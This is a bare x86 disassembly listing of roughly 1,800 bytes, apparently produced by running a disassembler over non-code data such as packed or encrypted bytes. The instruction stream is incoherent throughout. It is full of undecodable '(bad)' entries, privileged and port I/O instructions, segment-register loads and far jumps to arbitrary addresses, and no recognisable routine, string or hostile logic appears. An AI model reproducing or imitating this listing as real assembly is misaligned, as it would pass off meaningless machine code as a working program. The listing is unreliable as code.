  411d1c:	cld    
  411d1d:	out    dx,eax
  411d1e:	neg    ch
  411d20:	popf   
  411d21:	fs mov ecx,0x1a252eaa
  411d27:	mov    ebp,0x807d12ea
  411d2c:	je     0x411d7e
  411d2e:	test   BYTE PTR [ecx-0x21],bl
  411d31:	fstp   DWORD PTR [ecx-0x24dec206]
  411d37:	mov    al,ds:0xb7600e5d
  411d3c:	xor    BYTE PTR ds:0x584d7348,ah
  411d42:	sbb    al,0x33
  411d44:	icebp  
  411d45:	lock outs dx,DWORD PTR ds:[esi]
  411d47:	fist   DWORD PTR [edx-0x76f3a0e4]
  411d4d:	xchg   DWORD PTR fs:[esi-0x5671d928],ecx
  411d54:	sub    al,0x36
  411d56:	jmp    0xf5d3:0x8c8b6982
  411d5d:	es fwait
  411d5f:	aad    0xa8
  411d61:	mov    ecx,0x3a100cc8
  411d66:	(bad)  
  411d67:	test   eax,0x6a99ea8b
  411d6c:	imul   edx,DWORD PTR [ecx+esi*4-0x24432695],0x8242fd9c
  411d77:	add    cl,cl
  411d79:	cmp    DWORD PTR fs:[edi],ecx
  411d7c:	rcl    BYTE PTR [edi+0x66d9be1c],1
  411d82:	jo     0x411dd4
  411d84:	stos   DWORD PTR es:[edi],eax
  411d85:	(bad)  
  411d86:	ins    DWORD PTR es:[edi],dx
  411d87:	xchg   edi,eax
  411d88:	cs pusha 
  411d8a:	ss push 0x725e2800
  411d90:	dec    esp
  411d91:	push   ebx
  411d92:	mov    WORD PTR [edi],cs
  411d94:	stc    
  411d95:	cs xchg ecx,eax
  411d97:	popf   
  411d98:	inc    edx
  411d99:	inc    ebx
  411d9a:	ja     0x411dc5
  411d9c:	mov    bh,0x8
  411d9e:	or     eax,0xc2105c98
  411da3:	sbb    eax,0x401b01e4
  411da8:	loopne 0x411d3e
  411daa:	sbb    DWORD PTR [ecx],edi
  411dac:	ds call 0x128d484e
  411db2:	test   eax,esi
  411db4:	ins    BYTE PTR es:[edi],dx
  411db5:	dec    edx
  411db6:	push   ds
  411db7:	mov    ds:0x4b927b67,eax
  411dbc:	dec    edx
  411dbd:	inc    edi
  411dbe:	sub    eax,0x5cfdc254
  411dc3:	and    eax,0x7995c0a5
  411dc8:	data16 sub al,0x87
  411dcb:	loope  0x411d96
  411dcd:	adc    DWORD PTR [eax],eax
  411dcf:	mov    ebx,0xf19cc56f
  411dd4:	push   esi
  411dd5:	push   ecx
  411dd6:	sbb    BYTE PTR [edx+0x17],bh
  411dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dda:	jnp    0x411e0a
  411ddc:	xchg   edx,eax
  411ddd:	mov    edx,0x874b1bf5
  411de2:	pop    ecx
  411de3:	icebp  
  411de4:	fiadd  WORD PTR [ebp+0x5b]
  411de7:	sbb    DWORD PTR ds:[ebx+0x22af2797],ecx
  411dee:	pop    es
  411def:	pop    ss
  411df0:	fist   DWORD PTR [ebx-0x73ac92ce]
  411df6:	jge    0x411dd0
  411df8:	shl    DWORD PTR [eax-0x38],1
  411dfb:	xchg   BYTE PTR [eax-0x5954ee4],dl
  411e01:	jae    0x411df1
  411e03:	addr16 popa 
  411e05:	and    al,0x61
  411e07:	dec    esp
  411e08:	jmp    0x27be:0xe047e27d
  411e0f:	xchg   esi,eax
  411e10:	(bad)  
  411e11:	mov    cs,WORD PTR [esp+eax*8+0x76]
  411e15:	popf   
  411e16:	push   0x33e6bc62
  411e1b:	sbb    DWORD PTR [ebx],0xffffffde
  411e1e:	mov    al,ds:0xaf6427d2
  411e23:	mov    ss,WORD PTR [esi-0x7d271507]
  411e29:	mov    esi,0x306d4643
  411e2e:	adc    BYTE PTR [ebx],dh
  411e30:	adc    bh,BYTE PTR [edi+0x22]
  411e33:	sub    ebp,DWORD PTR [ebp+0x3a8b1717]
  411e39:	sbb    ebx,DWORD PTR [ebx+0x6b]
  411e3c:	xchg   esp,eax
  411e3d:	xchg   edi,eax
  411e3e:	nop
  411e3f:	jle    0x411dcc
  411e41:	dec    edx
  411e42:	(bad)  
  411e44:	mov    edx,0xe978e28a
  411e49:	add    al,0x91
  411e4b:	stos   BYTE PTR es:[edi],al
  411e4c:	sbb    cl,BYTE PTR [edi]
  411e4e:	shl    esi,1
  411e50:	icebp  
  411e51:	jae    0x411df6
  411e53:	sub    esp,esi
  411e55:	in     eax,dx
  411e56:	loop   0x411ea9
  411e58:	bound  ecx,QWORD PTR [ebx+ebx*1+0x5b]
  411e5c:	inc    ebx
  411e5d:	fld    QWORD PTR [edx+0x4a742c9e]
  411e63:	daa    
  411e64:	test   BYTE PTR [ecx+0x6f92c503],bl
  411e6a:	sbb    al,0x30
  411e6c:	inc    esi
  411e6d:	pop    ebp
  411e6e:	push   0x2e
  411e70:	adc    DWORD PTR [ebx],eax
  411e72:	bnd jns 0x411df7
  411e75:	out    0x1a,al
  411e77:	imul   edx,DWORD PTR [edi],0x6ee7e5e0
  411e7d:	and    al,0x8e
  411e7f:	mov    esi,0x59598fda
  411e84:	xchg   esp,eax
  411e85:	cmp    al,0x93
  411e87:	leave  
  411e88:	rol    BYTE PTR [ebx-0x7a],1
  411e8b:	pop    ds
  411e8c:	and    esi,DWORD PTR [edi-0x4fb6a695]
  411e92:	out    dx,al
  411e93:	dec    eax
  411e94:	(bad)  
  411e95:	push   edi
  411e96:	rcl    DWORD PTR [ecx-0x58],0xb5
  411e9a:	jecxz  0x411e46
  411e9c:	adc    al,0x94
  411e9e:	add    BYTE PTR [eax+0x1f],dl
  411ea1:	or     DWORD PTR ds:0x1ef23740,ebp
  411ea7:	sub    BYTE PTR [edx+edi*2],bh
  411eaa:	cli    
  411eab:	les    edi,FWORD PTR [esi-0x49]
  411eae:	jno    0x411f28
  411eb0:	in     eax,dx
  411eb1:	pushf  
  411eb2:	mov    ebp,DWORD PTR [ecx]
  411eb4:	fnstcw WORD PTR [ebx+eax*2]
  411eb7:	fnsave [eax+eiz*2+0x6e]
  411ebb:	push   eax
  411ebc:	cmp    al,BYTE PTR [ecx]
  411ebe:	fwait
  411ebf:	je     0x411e42
  411ec1:	(bad)  
  411ec3:	fistp  DWORD PTR ds:0xcd938016
  411ec9:	or     bl,BYTE PTR [edi-0x47c0f489]
  411ecf:	retf   
  411ed0:	ret    0x9316
  411ed3:	aad    0x68
  411ed5:	inc    ecx
  411ed6:	dec    DWORD PTR [edi+edi*8-0x48990af2]
  411edd:	xchg   ebp,eax
  411ede:	jb     0x411f36
  411ee0:	push   es
  411ee1:	aaa    
  411ee2:	rcr    BYTE PTR [eax-0x77f1ef79],1
  411ee8:	sub    al,0xfb
  411eea:	inc    ecx
  411eeb:	retf   0xf41d
  411eee:	xchg   edi,eax
  411eef:	push   0xda262591
  411ef4:	push   ecx
  411ef5:	mov    bh,0xfb
  411ef7:	out    0x2b,eax
  411ef9:	jmp    0xc7a54cd1
  411efe:	add    DWORD PTR [edi+0x75ca72cb],esp
  411f04:	loop   0x411f0d
  411f06:	mov    eax,0xd995cb21
  411f0b:	sub    al,0xad
  411f0d:	das    
  411f0e:	jg     0x411ea1
  411f10:	test   eax,0x6ecc5808
  411f15:	fwait
  411f16:	sbb    BYTE PTR [edi],0x95
  411f19:	in     eax,0xb9
  411f1b:	stc    
  411f1c:	push   edi
  411f1d:	ins    BYTE PTR es:[edi],dx
  411f1e:	sbb    eax,0x62e28795
  411f23:	popa   
  411f24:	sbb    ecx,esp
  411f26:	xor    BYTE PTR ds:0x809d91f7,0x8c
  411f2d:	out    0x8d,al
  411f2f:	mov    bh,BYTE PTR cs:[edx]
  411f32:	fcomp  QWORD PTR [ecx*4-0x6661f50]
  411f39:	das    
  411f3a:	(bad)  
  411f3c:	fimul  WORD PTR [ecx-0x5d624e7]
  411f42:	(bad)  
  411f43:	sub    edi,ecx
  411f45:	mov    fs,eax
  411f47:	dec    ebx
  411f48:	mov    al,ds:0xa4839acf
  411f4d:	out    0xa1,al
  411f4f:	sbb    BYTE PTR [ecx+edi*1+0x67cc871b],ah
  411f56:	daa    
  411f57:	ror    DWORD PTR [esi-0x67613e45],0x99
  411f5e:	stos   BYTE PTR es:[edi],al
  411f5f:	and    BYTE PTR [edx-0x62],0x69
  411f63:	fistp  DWORD PTR [ebx+0x25a7725c]
  411f69:	stc    
  411f6a:	mov    ebp,DWORD PTR [esi+0x1f4d8a44]
  411f70:	stos   BYTE PTR es:[edi],al
  411f71:	pop    esp
  411f72:	inc    edi
  411f73:	xchg   esp,eax
  411f74:	pop    esi
  411f75:	pop    ecx
  411f76:	push   esi
  411f77:	fnsave [ecx]
  411f79:	mov    esi,0x92dfa20b
  411f7e:	jecxz  0x411f24
  411f80:	in     eax,dx
  411f81:	jecxz  0x411f92
  411f83:	jg     0x411f0e
  411f85:	adc    ebp,DWORD PTR [esp+ebp*1+0x4ddf5101]
  411f8c:	mov    esp,0xd4bf6afb
  411f91:	pop    ebp
  411f92:	(bad)  
  411f93:	clc    
  411f94:	or     dh,al
  411f96:	(bad)  [ecx-0x4bb4e63b]
  411f9c:	mov    esi,0x398588e3
  411fa1:	xchg   ebx,eax
  411fa2:	cmp    eax,0x2b1924e7
  411fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fa8:	jp     0x411f5a
  411faa:	sub    dh,BYTE PTR [edx]
  411fac:	sub    DWORD PTR es:[eax+0x53],esp
  411fb0:	lods   al,BYTE PTR ds:[esi]
  411fb1:	in     al,0xa
  411fb3:	sub    al,0x65
  411fb5:	jp     0x412013
  411fb7:	xchg   DWORD PTR [esi-0x738f15e3],esp
  411fbd:	in     eax,0x2f
  411fbf:	int    0xcd
  411fc1:	mov    eax,ds:0x37d41370
  411fc6:	imul   edx,DWORD PTR [ebx-0x6ec5cb13],0xeb2dba40
  411fd0:	inc    ecx
  411fd1:	test   eax,0x1d542089
  411fd6:	(bad)  
  411fd7:	push   esi
  411fd8:	mov    ?,WORD PTR [edi+0x1739157a]
  411fde:	jne    0x411fff
  411fe0:	scas   eax,DWORD PTR es:[edi]
  411fe1:	(bad)  
  411fe2:	fiadd  WORD PTR [edx+ebx*2-0x45]
  411fe6:	mov    eax,0xb0eea0e7
  411feb:	push   0xf70358e7
  411ff0:	fnstcw WORD PTR [ecx]
  411ff2:	dec    edi
  411ff3:	mov    bl,0xd0
  411ff5:	xchg   esp,eax
  411ff6:	jmp    0x4e5608ea
  411ffb:	call   0x4e69:0xa8cabfa7
  412002:	mov    dh,0x88
  412004:	cwde   
  412005:	repnz push ebx
  412007:	xchg   ebx,eax
  412008:	adc    edi,DWORD PTR [ecx]
  41200a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41200b:	std    
  41200c:	cwde   
  41200d:	or     dh,BYTE PTR [ebp+0x71472706]
  412013:	loop   0x411fb2
  412015:	push   esi
  412016:	mov    ebx,0x9e8f37b9
  41201b:	push   ebx
  41201c:	push   edi
  41201d:	mov    edi,DWORD PTR cs:[ecx]
  412020:	fst    QWORD PTR [edi]
  412022:	jae    0x412010
  412024:	mov    esi,0x9783dbc3
  412029:	push   esi
  41202a:	mov    eax,0x12808e79
  41202f:	or     eax,0xd1d15063
  412034:	js     0x412020
  412036:	xchg   ebx,eax
  412037:	jne    0x41201f
  412039:	jno    0x412071
  41203b:	jns    0x412022
  41203d:	mov    edx,0x8bb27148
  412042:	xchg   esi,eax
  412043:	aas    
  412044:	into   
  412045:	push   cs
  412046:	popa   
  412047:	mov    bh,0x2a
  412049:	inc    ecx
  41204a:	retf   
  41204b:	out    0xd8,eax
  41204d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41204e:	mov    edi,0x27640871
  412053:	mov    bh,0xb8
  412055:	fcom   DWORD PTR [edx-0x1ee59e6d]
  41205b:	retf   0xcae3
  41205e:	arpl   di,cx
  412060:	jb     0x41200e
  412062:	scas   al,BYTE PTR es:[edi]
  412063:	retf   0x32d1
  412066:	fisubr DWORD PTR [eax+0x4a]
  412069:	xchg   ecx,eax
  41206a:	mov    ebp,0xa17d993d
  41206f:	and    bl,dh
  412071:	jl     0x412015
  412073:	cmp    BYTE PTR [edi],dh
  412075:	std    
  412076:	je     0x4120bf
  412078:	lea    ecx,[edi+0xfc6c66c]
  41207e:	sbb    BYTE PTR [esi-0x5531f7da],al
  412084:	push   eax
  412085:	enter  0x598f,0x66
  412089:	sbb    ch,BYTE PTR [ebx+0x238fde11]
  41208f:	xchg   ebx,eax
  412090:	adc    al,0xbe
  412092:	cmp    edx,esi
  412094:	jl     0x8c4a5387
  41209a:	jnp    0x412083
  41209c:	xchg   edx,eax
  41209d:	data16 jo 0x4120d6
  4120a0:	xchg   ebp,eax
  4120a1:	and    al,0xfb
  4120a3:	outs   dx,DWORD PTR ds:[esi]
  4120a4:	fs stos DWORD PTR es:[edi],eax
  4120a6:	push   ecx
  4120a7:	iret   
  4120a8:	sbb    BYTE PTR ds:0xf04efa38,dh
  4120ae:	std    
  4120af:	mov    ebx,0xb59a0805
  4120b4:	xchg   ebp,eax
  4120b5:	rol    BYTE PTR [ecx+0x67],1
  4120b8:	shr    al,cl
  4120ba:	lods   eax,DWORD PTR ds:[esi]
  4120bb:	popa   
  4120bc:	out    dx,al
  4120bd:	call   0x38e977c8
  4120c2:	pop    esi
  4120c3:	sub    esp,DWORD PTR [ebp+edx*1+0x26609135]
  4120ca:	loopne 0x412100
  4120cc:	jne    0x412102
  4120ce:	xchg   ebp,eax
  4120cf:	add    eax,0x84e7a225
  4120d4:	sub    BYTE PTR [eax-0x7bf627fe],ah
  4120da:	xor    dh,BYTE PTR [esi]
  4120dc:	sub    al,0x6c
  4120de:	pop    esi
  4120df:	stc    
  4120e0:	and    DWORD PTR [ecx+eiz*2],edx
  4120e3:	xchg   edx,eax
  4120e4:	cdq    
  4120e5:	jnp    0x4120d5
  4120e7:	cmp    eax,esp
  4120e9:	jb     0x41208e
  4120eb:	mov    WORD PTR [ebp+0x76ad7f59],?
  4120f1:	jb     0x412131
  4120f3:	stos   DWORD PTR es:[edi],eax
  4120f4:	push   0x23f93640
  4120f9:	stos   DWORD PTR es:[edi],eax
  4120fa:	cmp    al,0x24
  4120fc:	push   ss
  4120fd:	(bad)  
  4120fe:	ja     0x4120cb
  412100:	imul   edx,DWORD PTR [edi+eax*8],0x6b
  412104:	sti    
  412105:	pop    edi
  412106:	pusha  
  412107:	fwait
  412108:	jmp    0x4120d3
  41210a:	inc    ebp
  41210b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41210c:	(bad)  
  41210d:	lods   al,BYTE PTR ds:[esi]
  41210e:	pushf  
  41210f:	inc    ebp
  412110:	inc    esp
  412111:	pop    es
  412112:	jne    0x41217e
  412114:	stc    
  412115:	xor    edi,DWORD PTR [ebp-0x42cf879c]
  41211b:	dec    eax
  41211c:	imul   ecx,DWORD PTR [edi+0x3cd14083],0xffffff95
  412123:	test   eax,0xa52d596b
  412128:	stc    
  412129:	ret    0x97b7
  41212c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41212d:	xchg   ebx,eax
  41212e:	mov    cl,0x24
  412130:	pop    ds
  412131:	sbb    ch,BYTE PTR [ecx]
  412133:	std    
  412134:	inc    edi
  412135:	(bad)  
  412136:	dec    edx
  412137:	sub    al,0x42
  412139:	inc    edx
  41213a:	push   edi
  41213b:	add    DWORD PTR ds:0x9802ad23,ecx
  412141:	cmp    BYTE PTR [edi-0x4557d99],cl
  412147:	push   0x9
  412149:	pop    ds
  41214a:	loopne 0x412150
  41214c:	les    esi,FWORD PTR fs:[edi-0xf84fbbf]
  412153:	call   0xed3153
  412158:	mov    bh,0xe6
  41215a:	cmp    DWORD PTR [edx],edx
  41215c:	leave  
  41215d:	cmp    al,0xdf
  41215f:	mov    cl,0x88
  412161:	ror    DWORD PTR [edx+0x5f],0xe5
  412165:	xor    DWORD PTR [eax-0x40],ebx
  412168:	into   
  412169:	or     eax,0x47b960e1
  41216e:	push   ecx
  41216f:	pop    ss
  412170:	loope  0x41218b
  412172:	dec    ebx
  412173:	fucom  st(7)
  412175:	sub    DWORD PTR [ebx+0x24],0xfffffff9
  412179:	adc    BYTE PTR [esi],bl
  41217b:	aad    0xc6
  41217d:	xor    eax,0x1e5595ea
  412182:	(bad)  
  412183:	jns    0x4121fd
  412185:	jp     0x412177
  412187:	retf   0xe608
  41218a:	pop    ebp
  41218b:	ins    DWORD PTR es:[edi],dx
  41218c:	cwde   
  41218d:	test   eax,0xd17e6357
  412192:	or     eax,0xd388a791
  412197:	inc    ebp
  412198:	stc    
  412199:	pop    ss
  41219a:	jecxz  0x412179
  41219c:	pop    edi
  41219d:	cmp    DWORD PTR [edi],esi
  41219f:	pop    edx
  4121a0:	les    edx,FWORD PTR [esi+0x11a81c27]
  4121a6:	jmp    0x889af57a
  4121ab:	int3   
  4121ac:	scas   al,BYTE PTR es:[edi]
  4121ad:	mov    sp,0x646a
  4121b1:	xor    al,0x76
  4121b3:	cmp    eax,0x111040ac
  4121b8:	imul   ecx,DWORD PTR [edx],0xa41ae866
  4121be:	icebp  
  4121bf:	cli    
  4121c0:	inc    edx
  4121c1:	push   eax
  4121c2:	mov    al,ds:0x12660b3d
  4121c7:	int    0xac
  4121c9:	and    esi,ebp
  4121cb:	mov    esp,0x1a55ceee
  4121d0:	mov    esp,0xb530da15
  4121d5:	xor    ebx,edi
  4121d7:	cmp    BYTE PTR [ebx],bl
  4121d9:	fisubr DWORD PTR [ecx+0x43e8aa6d]
  4121df:	or     eax,0x61dc34
  4121e4:	xor    eax,0x52b9f6ae
  4121e9:	sub    BYTE PTR [ecx-0x12],0xc2
  4121ed:	add    esp,DWORD PTR [ecx-0x3004bdfc]
  4121f3:	xor    eax,0xd34ef8fb
  4121f8:	pop    ebx
  4121f9:	idiv   DWORD PTR ds:0x6449e8f
  4121ff:	icebp  
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412202:	mov    cs,WORD PTR [esi]
  412204:	jecxz  0x41223d
  412206:	outs   dx,DWORD PTR ds:[esi]
  412207:	push   edx
  412208:	(bad)  
  412209:	rcl    ah,1
  41220b:	mov    edx,esi
  41220d:	mov    ecx,0x974303b9
  412212:	(bad)  [ebx*1+0x63a9007e]
  412219:	xchg   ebp,eax
  41221a:	mov    edx,0x1ae421a7
  41221f:	mov    ds:0xdd1ffdc9,al
  412224:	mov    edx,0x5ac68b55
  412229:	mov    ebx,eax
  41222b:	mov    al,0xad
  41222d:	mov    ch,0x1e
  41222f:	das    
  412230:	hlt    
  412231:	arpl   WORD PTR [eax+0x9],ax
  412234:	add    bh,BYTE PTR [edi]
  412236:	mov    edx,0x5cfd83c3
  41223b:	cld    
  41223c:	cmp    ah,BYTE PTR cs:[ecx]
  41223f:	cmp    eax,0xe4ab6ac2
  412244:	cmp    DWORD PTR [eax],esp
  412246:	push   cs
  412247:	aaa    
  412248:	and    al,0x39
  41224a:	and    DWORD PTR [ebx+ecx*4-0x6c9febac],ebp
  412251:	aas    
  412252:	fstp   st(3)
  412254:	dec    eax
  412255:	clc    
  412256:	jnp    0x412250
  412258:	cmp    esi,DWORD PTR [ecx+0x3c8fd365]
  41225e:	ins    DWORD PTR es:[edi],dx
  41225f:	aaa    
  412260:	mov    al,ds:0x862fdbfc
  412265:	inc    eax
  412266:	dec    edi
  412267:	cmc    
  412268:	test   al,0x43
  41226a:	add    eax,0x33fc28c3
  41226f:	addr16 inc ebx
  412271:	push   cs
  412272:	sar    DWORD PTR [edx+0x6f],cl
  412275:	sub    al,0xb5
  412277:	js     0x4122bb
  412279:	(bad)  
  41227a:	or     al,0xe3
  41227c:	inc    ebp
  41227d:	mov    ?,ecx
  41227f:	push   ebp
  412280:	sbb    eax,0xbeff095c
  412285:	xor    edi,DWORD PTR [edx]
  412287:	xor    edx,ebx
  412289:	sub    al,0xf9
  41228b:	push   0xffffff8e
  41228d:	or     eax,0xf189a45
  412292:	popa   
  412293:	pop    edi
  412294:	bound  ecx,QWORD PTR [ebx+0x58c69a65]
  41229a:	xchg   esi,eax
  41229b:	js     0x41221f
  41229d:	or     eax,0x77031ba0
  4122a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a3:	sub    al,0x67
  4122a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a6:	and    BYTE PTR [eax],ch
  4122a8:	mov    BYTE PTR [edx],bh
  4122aa:	(bad)  
  4122ab:	int    0xb
  4122ad:	test   eax,0xecec87df
  4122b2:	gs xchg ebp,eax
  4122b4:	or     bl,BYTE PTR [eax]
  4122b6:	icebp  
  4122b7:	jmp    0x4122e4
  4122b9:	int    0xcf
  4122bb:	xor    dh,ah
  4122bd:	(bad)  [edi+eax*1-0x32e52210]
  4122c4:	mov    esp,0x4a63a3fd
  4122c9:	fist   WORD PTR [ebp+ecx*8-0x44]
  4122cd:	aas    
  4122ce:	dec    DWORD PTR [ecx-0x3ac5df56]
  4122d4:	outs   dx,DWORD PTR ds:[esi]
  4122d5:	jmp    0x412356
  4122d7:	pop    ds
  4122d8:	pusha  
  4122d9:	js     0x4122c0
  4122db:	push   ebx
  4122dc:	xchg   ebx,eax
  4122dd:	mov    eax,0x2612aef8
  4122e2:	shl    DWORD PTR [edx+esi*1-0x67],cl
  4122e6:	outs   dx,BYTE PTR ds:[esi]
  4122e7:	pop    ecx
  4122e8:	pusha  
  4122e9:	xchg   edx,eax
  4122ea:	stos   DWORD PTR es:[edi],eax
  4122eb:	sbb    BYTE PTR [edi+0x42],cl
  4122ee:	std    
  4122ef:	inc    esp
  4122f0:	jno    0x412354
  4122f2:	fidivr DWORD PTR [ebp+0x4f]
  4122f5:	dec    eax
  4122f6:	mov    esi,0xa720ab57
  4122fb:	and    al,0x48
  4122fd:	(bad)  
  4122fe:	jo     0x412331
  412300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412301:	push   edi
  412302:	sti    
  412303:	sub    al,0x70
  412305:	popf   
  412306:	add    esp,DWORD PTR [ebp-0x14be7d04]
  41230c:	test   DWORD PTR [edx+0x3eecf9ee],esp
  412312:	rol    esp,0xc5
  412315:	xor    edx,DWORD PTR [esi+ebp*4+0x12f79c03]
  41231c:	ins    BYTE PTR es:[edi],dx
  41231d:	into   
  41231e:	stos   BYTE PTR es:[edi],al
  41231f:	mov    ds:0xef31a14d,eax
  412324:	mov    edi,0xaefce496
  412329:	punpckhbw mm3,QWORD PTR [ebx-0x6709aeac]
  412330:	add    BYTE PTR [edi+0x4fe28ca5],bh
  412336:	and    eax,DWORD PTR [edx+0x23]
  412339:	jg     0x412333
  41233b:	fnsave [ecx-0xd0a7bbe]
  412341:	(bad)  
  412342:	iret   
  412343:	enter  0xd477,0x25
  412347:	rcr    BYTE PTR ds:0xb42edc49,1
  41234d:	outs   dx,DWORD PTR ds:[esi]
  41234e:	jmp    FWORD PTR [edx+0x38ea466d]
  412354:	jo     0x4123a5
  412356:	jae    0x41238e
  412358:	test   BYTE PTR [edi+edx*1+0x61],bh
  41235c:	add    al,0xfc
  41235e:	cli    
  41235f:	pop    ebx
  412360:	lahf   
  412361:	call   0x5427d0f0
  412366:	cwde   
  412367:	pop    esp
  412368:	xor    BYTE PTR [ebx+ebx*1+0x37],ch
  41236c:	pop    ebp
  41236d:	mov    dl,0x9
  41236f:	ja     0x4122fa
  412371:	arpl   WORD PTR [edx],sp
  412373:	xchg   ebp,eax
  412374:	int3   
  412375:	fstp   QWORD PTR [ecx+0x17]
  412378:	(bad)  
  412379:	rcl    DWORD PTR [edx],1
  41237b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41237c:	(bad)
  41237f:	sar    esp,0xfa
  412382:	push   ds
  412383:	mov    ch,0x5e
  412385:	mov    edi,DWORD PTR [esi+0x3ede901b]
  41238b:	sbb    edi,ecx
  41238d:	mov    bl,0x23
  41238f:	xchg   ebx,eax
  412390:	stos   DWORD PTR es:[edi],eax
  412391:	ja     0x412355
  412393:	xchg   ebp,eax
  412394:	adc    ebx,DWORD PTR [ebx+edi*2]
  412397:	gs test DWORD PTR cs:[eax+0x3f8a597a],eax
  41239f:	stos   BYTE PTR es:[edi],al
  4123a0:	xchg   edi,eax
  4123a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a2:	jecxz  0x412343
  4123a4:	dec    esp
  4123a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123a6:	in     eax,0x14
  4123a8:	inc    ebp
  4123a9:	test   al,0x69
  4123ab:	jnp    0x4123d8
  4123ad:	in     eax,dx
  4123ae:	int    0xb5
  4123b0:	xor    edx,ecx
  4123b2:	sub    ah,cl
  4123b4:	mov    bl,0x82
  4123b6:	in     al,dx
  4123b7:	test   al,0xe5
  4123b9:	jmp    0x41241a
  4123bb:	loope  0x41241e
  4123bd:	fdiv   QWORD PTR [edx+ebp*2]
  4123c0:	adc    ebx,ebp
  4123c2:	and    dh,BYTE PTR [esp+edx*8-0x6b]
  4123c6:	repnz add DWORD PTR [edi+0x78],eax
  4123ca:	sahf   
  4123cb:	mov    edi,DWORD PTR [esi-0x7f]
  4123ce:	adc    eax,0x26ada788
  4123d3:	mov    eax,ds:0xe47fddf7
  4123d8:	lods   al,BYTE PTR ds:[esi]
  4123d9:	sub    DWORD PTR gs:[ecx],ebp
  4123dc:	mov    ds:0x9dd60d8b,al
  4123e1:	pop    edi
  4123e2:	add    DWORD PTR [edi-0x26],ebx
  4123e5:	push   ecx
  4123e6:	jmp    0xe2c7bb6e
  4123eb:	sbb    ecx,edi
  4123ed:	xchg   edi,eax
  4123ee:	mov    ds:0x79a3abfd,al
  4123f3:	ds gs aaa 
  4123f6:	out    dx,al
  4123f7:	xchg   DWORD PTR [ebx-0xbc79750],edx
  4123fd:	dec    ebx
  4123fe:	sub    ebx,0xffffffa4
  412401:	mov    cs,WORD PTR [ecx+ebp*2]
  412404:	std    
  412405:	test   eax,0xbbfac509
  41240a:	int    0x7b
  41240c:	jecxz  0x412435
  41240e:	call   0xc82d6c59
  412413:	icebp  
  412414:	aas    
  412415:	lods   al,BYTE PTR ds:[esi]
  412416:	sbb    ch,al
  412418:	sahf   
  412419:	(bad)  
  41241a:	xlat   BYTE PTR ds:[ebx]
  41241b:	in     eax,dx
  41241c:	cmp    BYTE PTR [ebx],dh
  41241e:	gs xchg edi,eax
  412420:	ds push ebx
  412422:	mov    ecx,0x97a4a895
  412427:	jge    0x412422
  412429:	cmp    edx,DWORD PTR [ecx+0x700c2ad]
  41242f:	push   esp
  412430:	imul   eax,DWORD PTR [edi-0x14898cca],0x53c036ff
  41243a:	xchg   esi,eax
  41243b:	mov    al,0xd6
  41243d:	jge    0x4123fb
  41243f:	mov    ah,0x35
  412441:	inc    ebx
  412442:	ret    
  412443:	dec    ecx
  412444:	stos   BYTE PTR es:[edi],al
  412445:	ins    DWORD PTR es:[edi],dx
  412446:	popf   
  412447:	std    
  412448:	jae    0x4124a5
  41244a:	iret   
  41244b:	add    al,0x6b
  41244d:	mov    esi,0x94af6826
  412452:	pop    edi
  412453:	mov    fs,WORD PTR [ecx]
  412455:	push   cs
  412456:	and    ah,BYTE PTR [esp+esi*2+0x3d665de0]
  41245d:	inc    edi
  41245e:	mov    esi,0x23fa4b22
  412463:	imul   edx,DWORD PTR [eax-0x74],0xc23a1b98
  41246a:	push   cs
  41246b:	push   ecx
  41246c:	xchg   DWORD PTR [ebp+edx*8+0x3],ecx
  412470:	inc    ebx
  412471:	jb     0x412481
  412473:	and    bl,BYTE PTR ds:0x487d80a3
  412479:	std    
  41247a:	and    al,0x2e
  41247c:	cmp    ebp,DWORD PTR [esi]
  41247e:	inc    esp
  41247f:	sbb    eax,0x7218b0b8
  412484:	shl    DWORD PTR [esi+eax*4+0x13029861],1
  41248b:	xor    DWORD PTR [esp+eax*8-0x75],0x55
  412490:	lods   eax,DWORD PTR ds:[esi]
  412491:	inc    ebx
  412492:	cmp    eax,0x9c2f8438
  412497:	(bad)
  41249b:	cs hlt 
  41249d:	scas   al,BYTE PTR es:[edi]
  41249e:	rol    DWORD PTR [ecx+edi*1+0x1ca52c],cl
  4124a5:	push   0xac703c85
  4124aa:	xor    eax,0xde22d5b8
  4124af:	cmp    edx,DWORD PTR [ebx-0x24]
  4124b2:	test   al,0x14
  4124b4:	mov    al,0xdd
  4124b6:	scas   al,BYTE PTR es:[edi]
  4124b7:	sbb    BYTE PTR [ecx],bh
  4124b9:	ret    
  4124ba:	scas   eax,DWORD PTR es:[edi]
  4124bb:	in     eax,dx
  4124bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124bd:	or     edx,DWORD PTR [edi+0x6f]
  4124c0:	cwde   
  4124c1:	movq   QWORD PTR [edx+0x45],mm2
  4124c5:	xor    eax,0x5677c2c
  4124ca:	pop    esp
  4124cb:	fcmovnb st,st(3)
  4124cd:	and    al,bh
  4124cf:	sub    BYTE PTR [ecx-0x73],dh
  4124d2:	retf   0xfbc3
  4124d5:	loope  0x412552
  4124d7:	imul   esi,DWORD PTR [edx-0x58],0xf52c9f59
  4124de:	mov    eax,0xd7ee8e0d
  4124e3:	mov    edi,0x50899a56
  4124e8:	cmp    eax,0xb7bf6b84
  4124ed:	shl    edx,1
  4124ef:	push   edi
  4124f0:	outs   dx,BYTE PTR ds:[esi]
  4124f1:	mov    ?,WORD PTR [ebp-0x38]
  4124f4:	fiadd  WORD PTR [eax+0x1ded2742]
  4124fa:	or     DWORD PTR [edi-0x7ce47b91],0xcb5b3035
  412504:	cs pop es
  412506:	dec    ebx
  412507:	int    0x50
  412509:	inc    ebp
  41250a:	mov    bh,0xa4
  41250c:	outs   dx,DWORD PTR ss:[esi]
  41250e:	(bad)  
